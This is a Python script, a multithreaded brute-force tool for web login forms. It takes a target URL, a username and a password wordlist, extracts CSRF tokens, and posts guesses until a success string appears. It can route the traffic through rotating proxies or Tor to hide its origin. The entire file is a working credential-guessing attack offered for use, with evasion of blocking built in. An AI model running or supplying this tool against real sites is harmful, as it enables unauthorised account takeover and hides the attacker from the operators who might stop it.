import os, sys, time, atexit
import threading, requests, queue
from socksconf import get_socks, proxy_checker


url = input('\n[+] Login page URL: ')
username = input('[+] Target username: ')
wordlist = input('[+] Password list (file): ')
successed_response_text = input('[+] Element from successed response: ')
thread_count = int(input('[+] Number of threads: '))
is_proxy = input('[+] Use proxy ? [y/N/t]: ') # t - tor proxy

q = queue.Queue(thread_count)

stopped = threading.Event()
threads = []

if is_proxy.lower() == 'y':
    socks = get_socks()
    cleaned = proxy_checker(socks)
    proxy = iter(cleaned)
    ip = next(proxy)
elif is_proxy.lower() == 't':
    print('\n\nChecking Tor socks...')
    try:
        response = requests.get(url, proxies={"http": 'socks5h://127.0.0.1:9050', "https": 'socks5h://127.0.0.1:9050'}, timeout=7)
        if response.status_code == 200:
            print('[Ok]')
    except:
        print('[ERROR] Error connecting Tor proxy. Make sure you enable tor service or switch port to 9050')
        exit()
else:
    pass

def bruter(_url, _username, _password):

    session = requests.session()
    if is_proxy.lower() == 'y':
        try:
            session.proxies = {'http': 'http://{}'.format(ip), 'https': 'http://{}'.format(ip)}
            session.get(_url)
        except:
            return
    elif is_proxy.lower() == 't':
        try:
            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
            session.get(_url)
        except:
            return
    else:
        try:
            session.get(_url)
        except Exception as e:
            print('[ERROR] {}'.format(e))

    if 'csrftoken' in session.cookies:
        csrftoken = session.cookies['csrftoken']
    elif 'csrf' in session.cookies:
        csrftoken = session.cookies['csrf']
    else:
        return

    try:
        login_data = dict(username=_username, password=_password, csrfmiddlewaretoken=csrftoken)

        if is_proxy.lower() == 'y' and login_data:
            session.proxies = {'http': 'http://{}'.format(ip), 'https': 'http://{}'.format(ip)}
            r = session.post(_url, data=login_data, headers=dict(Referer=_url))

        elif is_proxy.lower() == 't' and login_data:
            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
            r = session.post(_url, data=login_data, headers=dict(Referer=_url))

        elif login_data:
            r = session.post(_url, data=login_data, headers=dict(Referer=_url))

        if successed_response_text in r.text:
            return True

    except:
        return


def worker():
    while not stopped.is_set():
        try:
            line = q.get(True)

            # Если несколько потоков, то работает с задержкой (наверное не успевает обрабатывать запросы)
            if bruter(url, username, line):
                print('\n\n                        KEY FOUND! [ {} ]\n'.format(line))
                stopped.set()
                break

        except queue.Empty:
            continue


for _ in range (thread_count):
    try:
        if not stopped.is_set():
            t = threading.Thread(target = worker)
            t.start()
            threads.append(t)
    except Exception as e:
        print('[ERROR] {}'.format(e))


try:
    wordlist_len = sum(1 for line in open(wordlist))
    i = 0
    with open(wordlist, "r") as f:
        print('\n')
        for line in f:
            line = line.rstrip("\r\n")
            q.put(line, True)
            
            if is_proxy.lower() == 'y':
                print("\r using proxy: {6}  |  {0:<{3}}/{1:<{4}} keys tested  |  testing value [ {2:<{5}} ]       ".
                    format(i, wordlist_len, line, len(str(i)), len(str(wordlist_len)), len(line), ip), end = "") 
            elif is_proxy.lower() == 't':
                print("\r  using tor: 127.0.0.1:9050  |  {0:<{3}}/{1:<{4}} keys tested  |  testing value [ {2:<{5}} ]       ".
                    format(i, wordlist_len, line, len(str(i)), len(str(wordlist_len)), len(line)), end = "") 
            else:
                print("\r               {0:<{3}}/{1:<{4}} keys tested  |  testing value [ {2:<{5}} ]       ".
                    format(i, wordlist_len, line, len(str(i)), len(str(wordlist_len)), len(line)), end = "") 

            if i == wordlist_len and not stopped.is_set():
                print('\n\n[X]  KEY NOT FOUND\n')
                stopped.set()
                break

            i += 1

except Exception as e:
    print('[ERROR] {}'.format(e))

    
q.join()
stopped.set()